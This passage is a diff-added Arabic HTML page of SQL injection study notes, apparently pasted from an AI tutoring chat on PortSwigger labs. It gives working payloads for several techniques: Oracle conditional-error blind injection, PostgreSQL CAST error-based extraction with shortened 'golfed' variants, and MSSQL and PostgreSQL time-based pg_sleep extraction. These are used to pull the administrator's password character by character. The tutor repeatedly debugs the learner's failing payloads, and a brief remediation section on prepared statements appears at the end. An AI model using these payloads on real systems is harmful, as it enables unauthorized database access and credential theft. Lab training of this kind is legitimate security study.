+<p><strong>لماذا استخدمناه؟</strong> عندما أضفنا <code>dual</code> واختفى الخطأ، عرفنا فوراً وبشكل قاطع أن قاعدة البيانات الخلفية هي <strong>Oracle</strong>، وبالتالي كل الأكواد القادمة يجب أن تُكتب بصيغة Oracle.</p>
+</li>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> استعلمنا عن جدول باسم عشوائي غير موجود في الواقع (<code>not-a-real-table</code>).</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> للتأكد من أن قاعدة البيانات تقوم بمعالجة وتنفيذ استعلامنا فعلياً. بما أن الموقع أرجع خطأ (لأن الجدول غير موجود)، فهذا يثبت أننا نتحكم في مسار الاستعلام بنجاح.</p>
+</li>
+</ul>
+<h3 id="3">3. كود كشف جدول المستخدمين</h3>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> استعلمنا عن جدول اسمه <code>users</code> (وهو الاسم الشائع لجداول المستخدمين)، وأضفنا شرط <code>WHERE ROWNUM = 1</code>.</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> للتأكد من وجود جدول بهذا الاسم. وشرط <code>ROWNUM = 1</code> مهم جداً هنا في بيئة Oracle؛ لأنه يجبر الاستعلام على إرجاع <strong>صف واحد فقط</strong>، فلو أرجع الجدول صفوفاً كثيرة ستفشل عملية الدمج <code>||</code> ويظهر خطأ مضلل. عدم ظهور الخطأ هنا يعني أن جدول <code>users</code> موجود فعلاً.</p>
+</li>
+</ul>
+<h3 id="4">4. كود اختبار "السلاح" (الخطأ المشروط)</h3>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> استخدمنا جملة <code>CASE</code> الشرطية. الشرط هو <code>1=1</code> (صحيح دائماً)، وبالتالي سينفذ جزء الـ <code>THEN</code> وهو القسمة على صفر <code>1/0</code>. وقمنا بتغليفها داخل دالة <code>TO_CHAR()</code> لتحويل الناتج إلى نص ليتطابق مع نوع بيانات الـ <code>ELSE</code> التي ترجع نصاً فارغاً <code>''</code>.</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> هذا هو الكود الأهم؛ استخدمناه للتأكد من أننا نستطيع توليد خطأ بناءً على شرط صحيح. بما أن <code>1=1</code> صحيحة، فالموقع سينفذ القسمة على صفر ويرد بـ <strong>HTTP 500 Error</strong>.</p>
+</li>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> نفس الكود السابق ولكن غيرنا الشرط ليكون <code>1=2</code> (خاطئ دائماً).</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> للتأكد من الطرف الآخر للميزان؛ بما أن الشرط خاطئ، سيتخطى القسمة على صفر ويذهب للـ <code>ELSE</code> ويرجع نصاً فارغاً، فتفتح الصفحة طبيعية <strong>HTTP 200 OK</strong>. الآن أصبحنا نمتلك قناة اتصال: (خطأ 500 = نعم) / (طبيعي 200 = لا).</p>
+</li>
+</ul>
+<h3 id="5-administrator">5. كود كشف حساب الـ Administrator</h3>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> نقلنا سياق استعلام الـ <code>CASE</code> من الجدول الوهمي إلى جدول الـ <code>users</code> الفعلي، وحددنا السطر الخاص بالمستخدم <code>administrator</code>.</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> للتأكد من وجود مستخدم بهذا الاسم؛ فإذا كان الاسم موجوداً، سيتحقق الاستعلام وينفذ الـ <code>CASE</code> (التي بداخلها شرط 1=1 الصحيح دائماً) فتقع القسمة على صفر ويظهر خطأ 500. ظهور الخطأ أكد لنا وجود الحساب.</p>
+</li>
+</ul>
+<h3 id="6">6. كود استخراج طول كلمة المرور</h3>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> استبدلنا الشرط الافتراضي <code>1=1</code> بدالة <code>LENGTH(password)&gt;1</code> والتي تسأل عن طول كلمة مرور الـ administrator.</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> لمعرفة عدد حروف الباسورد. نقوم بإرسال هذا الكود إلى <strong>Burp Repeater</strong> ونغير الرقم تدريجياً (<code>&gt;1</code>, <code>&gt;2</code>, <code>&gt;3</code>...)، وطالما الموقع يعطي خطأ 500 فالطول أكبر من الرقم. عندما وصلنا إلى <code>&gt;20</code> واختفى الخطأ (HTTP 200)، عرفنا أن الشرط أصبح خاطئاً، وبالتالي الطول هو <strong>20 حرفاً</strong> بالضبط.</p>
+</li>
+</ul>
+<h3 id="7-intruder">7. كود استخراج الحروف (مرحلة الـ Intruder)</h3>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> استخدمنا دالة <code>SUBSTR(password,1,1)</code> لاقتطاع <strong>الحرف الأول فقط</strong>، ووضعنا علامات الـ Payload <code>§a§</code> لتقوم أداة Burp Intruder بتجربة كل الحروف والأرقام مكان هذا الحرف.</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> لمعرفة القيمة الفعلية لكل حرف. أرسلنا الكود للـ <strong>Intruder</strong>، والحرف الذي جعل الموقع يرد بـ <strong>HTTP 500</strong> هو الحرف الصحيح (لأن المساواة تحقق الشرط فتمت القسمة على صفر). بعد معرفة الحرف الأول، نغير يدوياً إعدادات الدالة إلى <code>SUBSTR(password,2,1)</code> لمعرفة الحرف الثاني، ونعيد تشغيل الـ Intruder، وهكذا حتى نجمع الـ 20 حرفاً كاملة.</p>
+</li>
+</ul>
+<hr />
+<h3 id="extracting-sensitive-data-via-verbose-sql-error-messagesextracting-sensitive-data-via-verbose-sql-error-messages">Extracting sensitive data via verbose SQL error messagesExtracting sensitive data via verbose SQL error messages:</h3>
+<h3 id="1-verbose-errors-query-structure"><strong>1. كشف بنية الاستعلام (Verbose Errors &amp; Query Structure)</strong></h3>
+<p>الفقرة الأولى تتحدث عن خطأ برمجي شائع، وهو أن الخادم (Server) يكون مبرمجاً ليظهر "رسائل خطأ تفصيلية" (Verbose Errors) للمستخدم بدلاً من رسائل عامة مثل "حدث خطأ".</p>
+<p>عندما تقوم بإدخال علامة اقتباس فردية (<code>'</code>) في حقل الإدخال (مثلاً الـ ID)، أنت تفسد بناء الجملة (Syntax) الخاصة بـ SQL. الخادم يرد برسالة خطأ مثل:</p>
+<blockquote>
+<p><code>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char</code></p>
+</blockquote>
+<p><strong>لماذا هذا مفيد للمهاجم؟</strong></p>
+<ul>
+<li>
+<p><strong>رؤية الكود المخفي:</strong> رسالة الخطأ كشفت لك الكود الفعلي الموجود في الـ Backend وهو: <code>SELECT * FROM tracking WHERE id = '...'</code>.</p>
+</li>
+<li>
+<p><strong>تسهيل الحقن:</strong> الآن أنت لست "أعمى" تماماً. أنت تعرف أن إدخالك يتم وضعه داخل علامات اقتباس فردية (<code>'</code>). لذلك، لكي تنجح في كتابة Payload سليم، يجب عليك إغلاق علامة الاقتباس الأولى، كتابة الكود الخبيث الخاص بك، ثم إضافة علامة تعليق (مثل <code>--</code> أو <code>#</code>) لتجاهل باقي الكود الأصلي وتجنب كسر الـ Syntax.</p>
+</li>
+</ul>
+<h3 id="2-error-based-extraction"><strong>2. استخراج البيانات باستخدام رسائل الخطأ (Error-Based Extraction)</strong></h3>
+<p>هذا هو الجزء الأهم. عادةً في الـ <strong>Blind SQLi</strong>، أنت لا ترى نتيجة الاستعلام (لا تظهر لك بيانات من الجداول). تضطر حينها لاستخدام تقنيات تعتمد على الوقت (Time-based) أو الصح والخطأ (Boolean-based) لتخمين البيانات حرفاً بحرف.</p>
+<p>لكن، إذا كانت قاعدة البيانات تظهر رسائل خطأ تفصيلية، يمكنك "إجبارها" على وضع <strong>البيانات الحساسة داخل رسالة الخطأ نفسها!</strong></p>
+<p><strong>كيف تعمل خدعة الـ <code>CAST()</code>؟</strong> دالة <code>CAST()</code> في SQL تُستخدم لتحويل البيانات من نوع إلى آخر (مثلاً من نص إلى رقم). النص الذي تدرسه يقترح استخدام Payload يشبه هذا:</p>
+<p>SQL</p>
+<pre><code>CAST((SELECT example_column FROM example_table) AS int)
+</code></pre>
+<p><strong>شرح السيناريو الذي يحدث في الـ Backend:</strong></p>
+<ol>
+<li>
+<p><strong>تنفيذ الاستعلام الفرعي (Subquery):</strong> قاعدة البيانات ستقوم أولاً بتنفيذ الجزء الذي بين الأقواس <code>SELECT example_column FROM example_table</code>. لنفترض أن هذا الاستعلام يجلب كلمة مرور أدمن، وقيمتها هي <code>"AdminP@ss"</code>.</p>
+</li>
+<li>
+<p><strong>محاولة التحويل (Type Conversion):</strong> الآن ستحاول الدالة <code>CAST</code> تحويل النص <code>"AdminP@ss"</code> إلى رقم صحيح (Integer) لأنك طلبت منها ذلك عبر <code>AS int</code>.</p>
+</li>
+<li>
+<p><strong>الاصطدام (The Error):</strong> قاعدة البيانات ستفشل في تحويل حروف إلى رقم، وستصدر رسالة خطأ فورية تقول:</p>
+</li>
+</ol>
+<blockquote>
+<p><code>ERROR: invalid input syntax for type integer: "AdminP@ss"</code></p>
+</blockquote>
+<p><strong>النتيجة:</strong> مبروك! لقد حصلت على البيانات الحساسة (<code>AdminP@ss</code>) مطبوعة بشكل صريح أمامك على الشاشة داخل رسالة الخطأ، ووفرت على نفسك عناء التخمين الأعمى.</p>
+<h3 id="3-bypassing-character-limits"><strong>3. تخطي حدود الحروف (Bypassing Character Limits)</strong></h3>
+<p>في الجملة الأخيرة، يذكر النص أن هذه الطريقة مفيدة إذا كان هناك قيود على عدد الحروف المسموح بإدخالها (Character Limit). الـ Payloads المستخدمة في الـ Blind SQLi (مثل التي تستخدم دوال <code>SLEEP</code> أو الشروط المعقدة <code>IF/CASE</code>) تكون عادة طويلة وتتكون من حروف كثيرة. بينما استدعاء خطأ باستخدام <code>CAST()</code> يكون قصيراً ومباشراً، مما يجعله مثالياً لتخطي فلاتر الطول (Length Filters).</p>
+<hr />
+<h3 id="visible-error-based-sql-injection-lab">Visible error-based SQL injection LAB:</h3>
+<p>Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '83MPPGdX20YXPoNS'CAST((SELECT username FROM users) AS int) -'. Expected  char</h4></p>
+<p>ممتاز جداً! هذا التطبيق العملي هو بالضبط ما يثبت فهمك. رسالة الخطأ التي ظهرت لك هنا هي خطأ في الـ <strong>Syntax</strong> (بناء الجملة)، وليست رسالة خطأ استخراج البيانات (CAST Error) التي نبحث عنها.</p>
+<p>دعنا نحلل الخطأ الذي حدث ولماذا ظهر، ثم نصلحه:</p>
+<h3 id="1-backend"><strong>1. تحليل ما حدث في الـ Backend</strong></h3>
+<p>بناءً على رسالة الخطأ، الكود في الخادم قام بدمج مدخلاتك بهذا الشكل:</p>
+<p>SQL</p>
+<pre><code>SELECT * FROM tracking WHERE id = '83MPPGdX20YXPoNS'CAST((SELECT username FROM users) AS int) -'
+</code></pre>
+<h3 id="2-payload"><strong>2. أين تكمن المشكلة في هذا الـ Payload؟</strong></h3>
+<p>هناك ثلاثة أخطاء صغيرة منعت قاعدة البيانات من تنفيذ الـ <code>CAST</code> وإظهار البيانات:</p>
+<ul>
+<li>
+<p><strong>المشكلة الأولى (غياب الرابط المنطقي):</strong> لقد قمت بإغلاق علامة التنصيص بنجاح <code>'</code>، ولكنك وضعت دالة <code>CAST</code> فوراً بعدها بدون أي رابط (Operator). في لغة SQL، لا يمكنك كتابة شرطين بجانب بعضهما هكذا. يجب أن تستخدم رابطاً مثل <code>AND</code> أو <code>OR</code>.</p>
+</li>
+<li>
+<p><strong>المشكلة الثانية (علامة التعليق الخاطئة):</strong> في نهاية الـ Payload، استخدمت شرطة واحدة <code>-</code>. في الـ SQL، التعليق (Comment) الذي يتجاهل باقي السطر يُكتب بشرطتين متتاليتين ومسافة <code>--</code> (أو علامة <code>#</code>). وبسبب أن التعليق لم يعمل، بقيت علامة التنصيص الأخيرة <code>'</code> (التي يضيفها الكود الأصلي) موجودة في النهاية بدون علامة أخرى تفتحها، مما أدى لظهور خطأ <em>"Unterminated string literal"</em>.</p>
+</li>
+<li>
+<p><strong>المشكلة الثالثة (تعدد الصفوف - Subquery Rows):</strong> الاستعلام <code>(SELECT username FROM users)</code> سيقوم بجلب <strong>كل</strong> أسماء المستخدمين من الجدول دفعة واحدة. دالة <code>CAST()</code> لا يمكنها تحويل جدول كامل إلى رقم، بل تحول قيمة واحدة فقط. سيؤدي هذا إلى خطأ آخر (Subquery returns more than 1 row) حتى لو كان الـ Syntax سليماً. يجب تحديد صف واحد باستخدام <code>LIMIT 1</code> (أو <code>ROWNUM = 1</code> حسب نوع قاعدة البيانات).</p>
+</li>
+</ul>
+<h3 id="3-payload"><strong>3. الحل والـ Payload الصحيح</strong></h3>
+<p>لكي نجبر قاعدة البيانات على تنفيذ الـ <code>CAST</code> وإظهار اسم المستخدم في رسالة الخطأ، يجب أن يكون إدخالك (Payload) بهذا الشكل:</p>
+<p>SQL</p>
+<pre><code>83MPPGdX20YXPoNS' AND CAST((SELECT username FROM users LIMIT 1) AS int)-- 
+</code></pre>
+<p><em>(ملاحظة: تأكد من وجود <strong>مسافة</strong> بعد الشرطتين <code>--</code> في النهاية، وفي بعض الأحيان في المتصفح يتم استبدال المسافة بـ <code>+</code> أو <code>%20</code>)</em>.</p>
+<p><strong>كيف سيبدو الكود النهائي في الـ Backend بعد هذا التعديل؟</strong></p>
+<p>SQL</p>
+<pre><code>SELECT * FROM tracking WHERE id = '83MPPGdX20YXPoNS' AND CAST((SELECT username FROM users LIMIT 1) AS int)-- '
+</code></pre>
+<p><strong>ماذا سيحدث الآن؟</strong></p>
+<ol>
+<li>
+<p>سيقرأ الخادم الـ <code>id</code> الأول بشكل سليم.</p>
+</li>
+<li>
+<p>سيجد الرابط <code>AND</code> وينتقل لتنفيذ الـ <code>CAST</code>.</p>
+</li>
+<li>
+<p>سيجلب اسم أول مستخدم (مثلاً <code>admin</code>).</p>
+</li>
+<li>
+<p>سيحاول تحويل كلمة <code>admin</code> إلى <code>int</code>.</p>
+</li>
+<li>
+<p>سيفشل التحويل، ويظهر لك الخطأ المطلوب: <code>ERROR: invalid input syntax for type integer: "admin"</code></p>
+</li>
+</ol>
+<p>وبذلك تكون قد نجحت في استخراج أول اسم مستخدم!</p>
+<p>مل هنا المساحة الهقدر اكتب فيها صغيرة</p>
+<p>هذه الملاحظة ممتازة جداً! وهذا بالضبط التطبيق العملي للسطر الأخير في الشرح النظري الذي قرأناه: <em>"هذا النوع مفيد إذا كان هناك قيود على عدد الحروف (Character Limit)"</em>.</p>
+<p>بما أن المساحة (أو عدد الحروف المسموح بها) صغيرة، يجب علينا كتابة <strong>أقصر Payload ممكن</strong> (Payload Golfing). لتوفير المساحة، سنقوم ببعض الحيل:</p>
+<h3 id="1-id"><strong>1. تخلص من الـ ID الأصلي</strong></h3>
+<p>أنت لست مجبراً على إبقاء الـ ID الأصلي (<code>83MPPGdX20YXPoNS</code>) الذي يستهلك 16 حرفاً من المساحة المتاحة. يمكنك مسحه تماماً والبدء بحقن الكود الخاص بك مباشرة باستخدام أي حرف أو رقم وهمي، أو حتى تركه فارغاً.</p>
+<h3 id="2_3"><strong>2. احذف المسافات غير الضرورية</strong></h3>
+<p>قاعدة البيانات تستطيع قراءة الأقواس بدون مسافات قبلها أو بعدها. يمكننا دمج الكلمات لتقليل حجم الـ Payload.</p>
+<h3 id="payloads"><strong>أقصر Payloads يمكنك تجربتها:</strong></h3>
+<p><strong>الخيار الأول (بسيط ومختصر):</strong> قم بمسح الـ ID القديم بالكامل، وضع هذا الكود فقط:</p>
+<p>SQL</p>
+<pre><code>1' AND CAST((SELECT username FROM users LIMIT 1)AS int)-- 
+</code></pre>
+<p><em>(لاحظ أننا حذفنا المسافة قبل <code>AS int</code> لتوفير مساحة).</em></p>
+<p><strong>الخيار الثاني (استخدام علامة التساوي لتقصير الـ Operator):</strong> بدلاً من استخدام <code>AND</code>، يمكننا استخدام <code>=</code> وهي تستهلك حروفاً أقل:</p>
+<p>SQL</p>
+<pre><code>1'=CAST((SELECT username FROM users LIMIT 1)AS int)-- 
+</code></pre>
+<p><strong>الخيار الثالث (إذا كانت قاعدة البيانات PostgreSQL أو Oracle):</strong> يمكننا استخدام علامة الدمج <code>||</code> لتوفير مساحة أكبر:</p>
+<p>SQL</p>
+<pre><code>'||CAST((SELECT username FROM users LIMIT 1)AS int)-- 
+</code></pre>
+<h3 id="_8"><strong>نصيحة سريعة أثناء التطبيق:</strong></h3>
+<p>إذا كنت تحل هذا اللاب (Lab) داخل منصة مثل <strong>PortSwigger</strong>، وتواجه مشكلة أن حقل الإدخال في المتصفح (Input Box) يمنعك من كتابة حروف إضافية، يمكنك تجاوز هذا القيد بسهولة من خلال اعتراض الطلب باستخدام أداة <strong>Burp Suite</strong> (في تبويب Repeater)، وهناك يمكنك كتابة Payload بأي طول تريده دون التقيد بحدود حقل المتصفح، لكن استخدام الأكواد المختصرة في الأعلى سيفي بالغرض في كل الأحوال.</p>
+<p>ERROR: argument of AND must be type boolean, not type integer</p>
+<p>Position: 42</p>
+<p>رائع جداً! ظهور هذا الخطأ تحديداً يعتبر تقدماً ممتازاً، لأنه يكشف لنا سراً مهماً: قاعدة البيانات التي نتعامل معها هي <strong>PostgreSQL</strong>! وهي معروفة بأنها صارمة جداً (Strict) في التعامل مع أنواع البيانات.</p>
+<h3 id="_9"><strong>لماذا ظهر هذا الخطأ؟</strong></h3>
+<p>الخطأ يقول بوضوح: <code>argument of AND must be type boolean, not type integer</code>. في قواعد بيانات PostgreSQL، الرابط <code>AND</code> يتطلب أن يكون على يمينه ويساره شروط منطقية نتيجتها إما "صح" أو "خطأ" (Boolean). في الـ Payload الذي استخدمته، أنت وضعت دالة <code>CAST(... AS int)</code> بعد الـ <code>AND</code> مباشرة. وبما أن نتيجة هذه الدالة هي <strong>رقم</strong> (Integer)، قاعدة البيانات اعترضت وقالت: <em>"لا يمكنني استخدام رقم كشرط مع AND، يجب أن يكون الشرط Boolean"</em>.</p>
+<p>بسبب هذا الاعتراض، توقفت قاعدة البيانات عن العمل <strong>قبل</strong> أن تحاول تنفيذ الـ <code>CAST</code> واستخراج اسم المستخدم.</p>
+<h3 id="_10"><strong>كيف نصلح ذلك؟</strong></h3>
+<p>الحل بسيط جداً! كل ما علينا فعله هو تحويل دالة الـ <code>CAST</code> إلى "شرط منطقي" (Boolean). كيف نفعل ذلك؟ بمجرد مقارنتها بأي رقم (مثل 1) باستخدام علامة يساوي <code>=</code>.</p>
+<p>بهذا الشكل، نحن نقول لقاعدة البيانات: "هل 1 يساوي الرقم الناتج من CAST؟"، وهذا يعتبر شرطاً سليماً (Boolean).</p>
+<h3 id="payloads_1"><strong>الـ Payloads الصحيحة (جربها الآن):</strong></h3>
+<p><strong>الخيار الأول (باستخدام AND ومقارنتها برقم):</strong></p>
+<p>SQL</p>
+<pre><code>1' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- 
+</code></pre>
+<p><strong>الخيار الثاني (الأفضل والأقصر لتوفير المساحة):</strong> يمكننا الاستغناء عن <code>AND</code> تماماً، واستخدام علامة <code>=</code> مباشرة ليصبح إدخالك بالكامل عبارة عن شرط:</p>
+<p>SQL</p>
+<pre><code>1'=CAST((SELECT username FROM users LIMIT 1) AS int)-- 
+</code></pre>
+<p><strong>ماذا سيحدث هذه المرة؟</strong> قاعدة البيانات سترى الشرط سليم وتوافق على تشغيله، ثم ستذهب لجلب اسم المستخدم (مثلاً <code>admin</code>) لتحوله إلى رقم لتقارنه، وهنا ستفشل ويظهر لك الخطأ الذهبي الذي ننتظره: <code>ERROR: invalid input syntax for integer: "admin"</code></p>
+<hr />
+<h3 id="exploiting-blind-sql-injection-by-triggering-time-delays">Exploiting blind SQL injection by triggering time delays:</h3>
+<p>دخلنا الآن في مرحلة "الظلام التام"! التقنية الجديدة التي أرسلتها هي <strong>Time-based Blind SQL Injection</strong> (الحقن الأعمى القائم على الوقت).</p>
+<p>في المرة السابقة، كان الموقع "كريمًا" معنا ويظهر رسائل خطأ تفصيلية استفدنا منها. أما الآن، افترض أن مطور الموقع قام بإصلاح هذا الأمر، وأصبح الموقع يبتلع الأخطاء (Handles errors gracefully). بمعنى أنه لو حدث خطأ في قاعدة البيانات، سيعود لك الموقع بصفحة طبيعية جداً وكأن شيئاً لم يكن.</p>
+<p>هنا، نحن لا نرى بيانات، ولا نرى رسائل خطأ... فكيف سنجعل قاعدة البيانات تتحدث معنا؟ <strong>عن طريق "الوقت"!</strong></p>
+<h3 id="1-the-core-concept"><strong>1. الفكرة العبقرية خلف الوقت (The Core Concept)</strong></h3>
+<p>تطبيقات الويب غالباً ما تعالج الطلبات بشكل متزامن (Synchronous). يعني ذلك أن المتصفح يرسل الطلب، وينتظر الخادم (Server)، والخادم ينتظر قاعدة البيانات لتنتهي من عملها، ثم يعود الرد للمتصفح.</p>
+<p>إذا استطعنا إجبار قاعدة البيانات على أن "تنام" أو "تنتظر" لعدة ثوانٍ قبل أن ترد، فإن الرد سيتأخر عن المتصفح. هذا التأخير هو "الإشارة" (Oracle) التي نعرف من خلالها إذا كان شرطنا صحيخاً أم خاطئاً.</p>
+<h3 id="2-sql-server"><strong>2. تحليل أمثلة الـ SQL Server</strong></h3>
+<p>النص يقدم مثالاً باستخدام قاعدة بيانات <strong>Microsoft SQL Server</strong> والأمر <code>WAITFOR DELAY '0:0:10'</code> (والذي يعني: انتظر 10 ثوانٍ).</p>
+<ul>
+<li>
+<p><strong>السيناريو الأول (الشرط خاطئ):</strong> <code>'; IF (1=2) WAITFOR DELAY '0:0:10'--</code> هنا الخادم يسأل: هل 1 تساوي 2؟ الإجابة: لا (False). إذن لن ينفذ أمر الانتظار، وسيعود الموقع فوراً (في أجزاء من الثانية).</p>
+</li>
+<li>
+<p><strong>السيناريو الثاني (الشرط صحيح):</strong> <code>'; IF (1=1) WAITFOR DELAY '0:0:10'--</code> هنا الخادم يسأل: هل 1 تساوي 1؟ الإجابة: نعم (True). إذن سينفذ أمر الانتظار وتتجمد قاعدة البيانات لمدة 10 ثوانٍ. ستلاحظ أن المتصفح يأخذ وقتاً طويلاً ليحمل الصفحة.</p>
+<blockquote>
+<p><strong>النتيجة:</strong> التأخير الزمني هنا أخبرنا بمعلومة سرية: "الشرط الذي وضعناه تحقق بنجاح!".</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="3-data-extraction"><strong>3. كيف نسرق البيانات حرفاً بحرف؟ (Data Extraction)</strong></h3>
+<p>بما أننا نستطيع معرفة "صح" أو "خطأ" عبر الوقت، يمكننا الآن تخمين كلمة المرور (Password) الخاصة بالـ <code>Administrator</code> حرفاً بحرف باستخدام دالة <code>SUBSTRING</code>.</p>
+<p>تعال نفكك هذا الـ Payload المعقد الذي أرسلته:</p>
+<p>SQL</p>
+<pre><code>'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:10'--
+</code></pre>
+<p><strong>ماذا يحدث في كواليس قاعدة البيانات؟</strong></p>
+<ol>
+<li>
+<p><code>SUBSTRING(Password, 1, 1)</code>: هذا الأمر يعني "قص لي أول حرف فقط من كلمة المرور".</p>
+</li>
+<li>
+<p><code>&gt; 'm'</code>: هل هذا الحرف الأول ترتيبه الأبجدي أكبر من حرف <code>m</code>؟</p>
+</li>
+<li>
+<p><strong>الاحتمال الأول (إذا تأخر الموقع 10 ثوانٍ):</strong> هذا يعني أن الشرط <strong>صحيح</strong>، وأن الحرف الأول فعلاً أكبر من <code>m</code> (قد يكون n, o, p... إلخ).</p>
+</li>
+<li>
+<p><strong>الاحتمال الثاني (إذا فتح الموقع فوراً):</strong> هذا يعني أن الشرط <strong>خاطئ</strong>، وأن الحرف الأول أصغر من أو يساوي <code>m</code> (قد يكون a, b, c... إلخ).</p>
+</li>
+</ol>
+<p>بناءً على الوقت، نقوم بتضييق النطاق وتجربة الحروف حتى نعرف الحرف الأول تماماً (مثلاً نكتشف أنه <code>s</code>). ثم ننتقل للحرف الثاني وتعديل الكود إلى <code>SUBSTRING(Password, 2, 1)</code> وهكذا حتى نستخرج كلمة المرور كاملة!</p>
+<h3 id="_11"><strong>ملاحظة ذكية لك (تطبيقاً على ما تعلمناه):</strong></h3>
+<p>النص يتحدث عن صيغة لـ <em>MS SQL Server</em> (<code>WAITFOR DELAY</code>). لكن بما أننا عرفنا في المحادثة السابقة أن موقعك يعمل على <strong>PostgreSQL</strong>، فإن الصيغة ستختلف قليلاً. في PostgreSQL لا نستخدم <code>IF</code> و <code>WAITFOR</code> بهذا الشكل، بل نستخدم دالة اسمها <code>pg_sleep()</code>.</p>
+<p>هل تحب أن نرى كيف نكتب هذا الـ Payload بصيغة تتوافق مع الـ PostgreSQL التي تتدرب عليها؟
+في قواعد بيانات <strong>PostgreSQL</strong>، تختلف طريقة كتابة الاستعلامات الزمنية (Time-based) جوهرياً عن SQL Server.</p>
+<p>السبب في ذلك هو أن PostgreSQL <strong>لا تدعم</strong> استخدام جملة <code>IF</code> الشرطية بشكل مباشر داخل استعلامات <code>SELECT</code> العادية (جمل <code>IF</code> مخصصة فقط للوظائف البرمجية أو ما يُعرف بـ PL/pgSQL).</p>
+<p>بدلاً من ذلك، نستخدم حيلة ذكية تعتمد على دالة <code>pg_sleep(seconds)</code> مدمجة داخل شرط <code>WHERE</code> أو باستخدام جملة <code>CASE WHEN</code>.</p>
+<h3 id="postgresql"><strong>طريقة بناء الاستعلام في PostgreSQL</strong></h3>
+<p>الفكرة البديلة لـ <code>IF</code> هي أن نجعل دالة <code>pg_sleep</code> تنام فقط <strong>إذا تحقق الشرط</strong> داخل جملة <code>WHERE</code>.</p>
+<p>هكذا تبدو البنية النظرية العامة للاستعلام:</p>
+<p>SQL</p>
+<pre><code>' AND 1=(SELECT 1 FROM pg_sleep(10) WHERE (الشرط_الذي_نريد_اختباره))--
+</code></pre>
+<p><strong>كيف تعمل هذه الحيلة؟</strong> قاعدة البيانات عندما تقرأ <code>SELECT FROM pg_sleep(10) WHERE ...</code> ستقوم أولاً بتقييم الشرط الموجود في الـ <code>WHERE</code>:</p>
+<ul>
+<li>
+<p><strong>إذا كان الشرط صحيحاً (True):</strong> ستقوم بتنفيذ الدالة وتفعيل <code>pg_sleep(10)</code>، فيتأخر الرد 10 ثوانٍ.</p>
+</li>
+<li>
+<p><strong>إذا كان الشرط خاطئاً (False):</strong> سيتجاهل الخادم الاستعلام بالكامل ولن يتم استدعاء <code>pg_sleep</code> أبداً، ويعود الرد فوراً.</p>
+</li>
+</ul>
+<h3 id="query-postgresql"><strong>تعديل الـ Query الخاصة بك لتناسب PostgreSQL</strong></h3>
+<p>لتطبيق هذا المفهوم على نفس الاستعلام الخاص باستخراج كلمة المرور حرفاً بحرف، سنقوم بصياغته بهذا الشكل:</p>
+<p>SQL</p>
+<pre><code>1' AND 1=(SELECT 1 FROM pg_sleep(5) WHERE (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a')--
+</code></pre>
+<p><em>(ملحوظة: قمت بتقليل وقت النوم إلى 5 ثوانٍ بدلاً من 10 لتوفير وقتك أثناء التجربة والحل).</em></p>
+<p><strong>تحليل ما يحدث خلف الكواليس:</strong></p>
+<ol>
+<li>
+<p>الخادم يفحص الشرط: "هل أول حرف من كلمة مرور الـ administrator هو حرف <code>a</code>؟"</p>
+</li>
+<li>
+<p>إذا كان الحرف فعلاً <code>a</code>، سيتم تفعيل <code>pg_sleep(5)</code> ويتأخر الموقع 5 ثوانٍ.</p>
+</li>
+<li>
+<p>إذا لم يكن <code>a</code>، سيفتح الموقع فوراً، فتعرف أن تخمينك خاطئ وتجرب حرفاً آخر (<code>b</code> ثم <code>c</code> وهكذا).</p>
+</li>
+</ol>
+<h3 id="remediation"><strong>الوقاية والدفاع (Remediation)</strong></h3>
+<p>بما أنك تدرس هذه الثغرة بكافة تفاصيلها، فمن المهم جداً معرفة كيف يقوم المطورون بحماية تطبيقاتهم منها بشكل نهائي.</p>
+<p>الحل الجذري لمنع جميع أنواع الـ SQL Injection (سواء كانت مرئية، تعتمد على الأخطاء، أو زمنية) هو استخدام <strong>الاستعلامات المُعلمات (Parameterized Queries / Prepared Statements)</strong>.</p>
+<p>عند استخدام الـ Prepared Statements، يتم فصل كود الـ SQL تماماً عن البيانات المدخلة من المستخدم. على سبيل المثال في بيئات البرمجة الحديثة، يتم كتابة الكود هكذا:</p>
+<p>Plaintext</p>
